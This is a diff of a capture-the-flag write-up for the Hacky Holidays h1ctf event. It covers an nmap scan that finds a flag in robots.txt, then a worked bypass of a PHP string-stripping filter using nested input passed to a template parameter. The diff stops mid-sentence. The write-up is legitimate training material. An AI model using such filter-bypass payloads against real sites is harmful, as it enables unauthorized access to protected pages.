@@ -2,7 +2,7 @@
 **Endpoint -> /robots.txt**  
 **Tools used : nmap**  
   
-Just a simple nmap scan with ```nmap -sC -sV hackyholidays.h1ctf.com```, result showed ```http-robots.txt: 1 disallowed entry```, looked into hackyholidays.h1ctf.com/robots.txt and the flag can be found there. 
+Just a simple nmap scan with ``nmap -sC -sV hackyholidays.h1ctf.com``, result showed ```http-robots.txt: 1 disallowed entry```, looked into hackyholidays.h1ctf.com/robots.txt and the flag can be found there. 
 
 --------------------------------------------------------------------------------
 
@@ -83,5 +83,14 @@ On running the code locally using the command ``php -i``, for now we will only w
 	$page = "payload_here" // this will be used to store and test payloads
 	$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
 	$page = str_replace("admin.php","",$page);
-	$page = str_replace("secretadmin.php","",$page);
+	echo $page = str_replace("secretadmin.php","",$page);
 ```
+Here is a small list of testcases that I used as payload and next to it is what happens to the payload in order to demonstrate how strings get sanitized:  
+```
+secretadmin.php -> secret
+admin.php       -> 
+secretadminadmin.php -> secretadmin
+secretadminadmin.php.php -> secret
+secretsecretadminadmin.php.php ->  secretadminsecret.php 
+```
+The most apt payload that I had crafted which translated to ``secretadmin.php`` was ``secretsecretadminadmin.php.phpadminadmin.php.php``. On using this payload as an input to the ``/?template=`` parameter, we hit a 200 HTTP Response Code and the flag
